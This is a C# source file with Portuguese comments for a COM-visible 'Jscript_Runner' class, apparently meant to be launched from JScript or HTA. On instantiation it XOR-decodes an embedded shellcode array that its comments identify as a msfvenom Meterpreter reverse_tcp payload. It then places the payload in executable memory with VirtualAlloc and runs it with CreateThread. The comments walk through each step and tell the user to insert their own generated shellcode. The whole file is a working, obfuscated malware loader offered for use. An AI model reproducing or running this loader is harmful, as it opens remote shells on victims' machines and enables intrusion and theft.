using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Jscript_Runner
{
    [ComVisible(true)]
    public class Runner
    {
        // Importando VirtualAlloc da kernel32.dll
        // Aloca memória no processo atual.
        // Parâmetros:
        // - lpAddress: endereço sugerido (IntPtr.Zero permite que o SO escolha).
        // - dwSize: tamanho em bytes da região a alocar.
        // - flAllocationType: tipo de alocação (MEM_COMMIT, MEM_RESERVE, etc.).
        // - flProtect: proteção da página (ex.: PAGE_EXECUTE_READWRITE para RWX).
        // Retorno: ponteiro para a memória alocada (IntPtr.Zero em falha).
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // Importando CreateThread da kernel32.dll
        // Cria uma nova thread no processo atual que começa a executar em lpStartAddress.
        // Parâmetros:
        // - lpThreadAttributes: segurança da thread (geralmente IntPtr.Zero)
        // - dwStackSize: tamanho da pilha da thread (0 usa padrão)
        // - lpStartAddress: endereço da função onde a thread iniciará (no nosso caso, o shellcode)
        // - lpParameter: parâmetro passado à thread (não usado aqui, normalmente IntPtr.Zero)
        // - dwCreationFlags: flags de criação (0 = iniciar imediatamente)
        // - lpThreadId: saída opcional com ID da thread (IntPtr.Zero se não precisar)
        // Retorno: handle da thread (IntPtr.Zero em falha).
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Importando WaitForSingleObject (Opcional)
        // - hHandle: handle a esperar (por exemplo, handle da thread criada)
        // - dwMilliseconds: tempo máximo em ms (0xFFFFFFFF = INFINITE)
        // Retorno: código que indica o motivo do retorno (WAIT_OBJECT_0, WAIT_TIMEOUT, etc.)
        // OBS: evitar waits longos em hosts como WScript/HTA para não travar a UI.
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // Constantes de Memória (explicadas):
        // - MEM_COMMIT: reserva e compromete as páginas (0x1000)
        // - MEM_RESERVE: apenas reserva o espaço de endereçamento (0x2000)
        // - PAGE_EXECUTE_READWRITE: proteção que permite leitura, escrita e execução (0x40)
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // O Construtor: O código malicioso roda assim que a classe é instanciada ("new Runner()")
        public Runner()
        {
            Execute();
        }

        public void Execute()
        {
            // 1. O Payload (msfvenom -p windows/x64/meterpreter/reverse_tcp -f csharp)
            // Substitua este array pelo seu shellcode gerado no Kali
            byte[] buf = new byte[276] {
                0x7a, 0xce, 0x05, 0x62, 0x76, 0x6e, 0x46, 0x86, 0x86, 0x86, 0xc7, 0xd7,
                0xc7, 0xd6, 0xd4, 0xd7, 0xd0, 0xce, 0xb7, 0x54, 0xe3, 0xce, 0x0d, 0xd4,
                0xe6, 0xce, 0x0d, 0xd4, 0x9e, 0xce, 0x0d, 0xd4, 0xa6, 0xce, 0x0d, 0xf4,
                0xd6, 0xce, 0x89, 0x31, 0xcc, 0xcc, 0xcb, 0xb7, 0x4f, 0xce, 0xb7, 0x46,
                0x2a, 0xba, 0xe7, 0xfa, 0x84, 0xaa, 0xa6, 0xc7, 0x47, 0x4f, 0x8b, 0xc7,
                0x87, 0x47, 0x64, 0x6b, 0xd4, 0xc7, 0xd7, 0xce, 0x0d, 0xd4, 0xa6, 0x0d,
                0xc4, 0xba, 0xce, 0x87, 0x56, 0x0d, 0x06, 0x0e, 0x86, 0x86, 0x86, 0xce,
                0x03, 0x46, 0xf2, 0xe1, 0xce, 0x87, 0x56, 0xd6, 0x0d, 0xce, 0x9e, 0xc2,
                0x0d, 0xc6, 0xa6, 0xcf, 0x87, 0x56, 0x65, 0xd0, 0xce, 0x79, 0x4f, 0xc7,
                0x0d, 0xb2, 0x0e, 0xce, 0x87, 0x50, 0xcb, 0xb7, 0x4f, 0xce, 0xb7, 0x46,
                0x2a, 0xc7, 0x47, 0x4f, 0x8b, 0xc7, 0x87, 0x47, 0xbe, 0x66, 0xf3, 0x77,
                0xca, 0x85, 0xca, 0xa2, 0x8e, 0xc3, 0xbf, 0x57, 0xf3, 0x5e, 0xde, 0xc2,
                0x0d, 0xc6, 0xa2, 0xcf, 0x87, 0x56, 0xe0, 0xc7, 0x0d, 0x8a, 0xce, 0xc2,
                0x0d, 0xc6, 0x9a, 0xcf, 0x87, 0x56, 0xc7, 0x0d, 0x82, 0x0e, 0xce, 0x87,
                0x56, 0xc7, 0xde, 0xc7, 0xde, 0xd8, 0xdf, 0xdc, 0xc7, 0xde, 0xc7, 0xdf,
                0xc7, 0xdc, 0xce, 0x05, 0x6a, 0xa6, 0xc7, 0xd4, 0x79, 0x66, 0xde, 0xc7,
                0xdf, 0xdc, 0xce, 0x0d, 0x94, 0x6f, 0xd1, 0x79, 0x79, 0x79, 0xdb, 0xce,
                0x3c, 0x87, 0x86, 0x86, 0x86, 0x86, 0x86, 0x86, 0x86, 0xce, 0x0b, 0x0b,
                0x87, 0x87, 0x86, 0x86, 0xc7, 0x3c, 0xb7, 0x0d, 0xe9, 0x01, 0x79, 0x53,
                0x3d, 0x66, 0x9b, 0xac, 0x8c, 0xc7, 0x3c, 0x20, 0x13, 0x3b, 0x1b, 0x79,
                0x53, 0xce, 0x05, 0x42, 0xae, 0xba, 0x80, 0xfa, 0x8c, 0x06, 0x7d, 0x66,
                0xf3, 0x83, 0x3d, 0xc1, 0x95, 0xf4, 0xe9, 0xec, 0x86, 0xdf, 0xc7, 0x0f,
                0x5c, 0x79, 0x53, 0xe5, 0xe7, 0xea, 0xe5, 0xa8, 0xe3, 0xfe, 0xe3, 0x86
            };

            // Loop de deobfuscação XOR (seu shellcode pode vir ofuscado)
            byte xKey = 0x86;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ xKey);
            }

            // 2. Alocar Memória (RWX)
            // - IntPtr.Zero: permite que o sistema escolha o melhor endereço
            // - MEM_COMMIT | MEM_RESERVE: reservar+comprometer páginas
            // - PAGE_EXECUTE_READWRITE: precisamos de execução para rodar o shellcode
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // 3. Copiar o Shellcode para a Memória Alocada
            // Em C#, usamos Marshal.Copy em vez de importar RtlMoveMemory manualmente. É mais limpo.
            Marshal.Copy(buf, 0, addr, size);

            // 4. Executar (Criar Thread)
            // Cria uma thread que começa a executar no endereço alocado (nosso shellcode).
            // Retorna um handle para a thread, que pode ser usado com WaitForSingleObject.
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // Opcional: WaitForSingleObject(hThread, 0xFFFFFFFF); 
            // Não recomendamos esperar em JScript/HTA pois pode travar a interface.
        }
    }
}
